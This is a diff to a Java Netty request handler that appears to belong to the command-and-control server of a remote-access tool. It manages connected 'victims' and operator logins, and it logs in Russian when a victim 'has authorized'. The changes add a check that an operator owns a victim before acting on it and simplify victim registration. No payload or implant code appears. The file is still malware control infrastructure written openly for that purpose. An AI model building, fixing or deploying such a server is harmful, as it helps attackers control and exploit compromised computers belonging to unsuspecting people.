@@ -1,4 +1,3 @@
-import db.DBManager;
 import io.netty.buffer.ByteBuf;
 import io.netty.channel.*;
 import org.json.simple.JSONArray;
@@ -55,6 +54,7 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
 
     @Override
     public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {
+        cause.printStackTrace();
         ctx.channel().close();
     }
 
@@ -73,7 +73,7 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
             Victim targetVictim = null;
             if (request.containsKey("victim")) {
                 targetVictim = nettyServer.getVictimByName((String) request.get("victim"));
-                if (targetVictim == null) {
+                if (targetVictim == null || !targetVictim.getOwners().contains(user.getLogin())) {
                     user.sendErrorCode(Config.VICTIM_OFFLINE);
                     return;
                 }
@@ -285,7 +285,7 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
                 ctx.writeAndFlush(response);
                 return;
             }
-            ArrayList<JSONObject> usersData = NettyServer.getDBManager().users.get(login, password);
+            ArrayList<JSONObject> usersData = NettyServer.getDBManager().DBUsers.get(login, password);
             if (usersData.size() == 0) {
                 response.put("errorCode", Config.INVALID_AUTH);
                 ctx.writeAndFlush(response);
@@ -297,13 +297,13 @@ public class RequestHandler extends ChannelInboundHandlerAdapter {
             newUser.sendAuthUser(newUser.getToken());
         } else if (action.equals("auth.victim")) {
             String name = (String) request.get("name");
-            ArrayList<String> owners = (ArrayList<String>) request.get("owners");
-            if (name == null || owners == null) {
+            //ArrayList<String> owners = (ArrayList<String>) request.get("owners");
+            if (name == null) {
                 response.put("errorCode", Config.INCORRECT_QUERY);
                 ctx.writeAndFlush(response);
                 return;
             }
-            Victim newVictim = new Victim(ctx, name, owners);
+            Victim newVictim = new Victim(ctx, name);
             nettyServer.getVictims().put(ctx.channel().id(), newVictim);
             System.out.println("Жертва " + newVictim.getName() + " авторизовалась!");
             newVictim.sendAuthVictim();
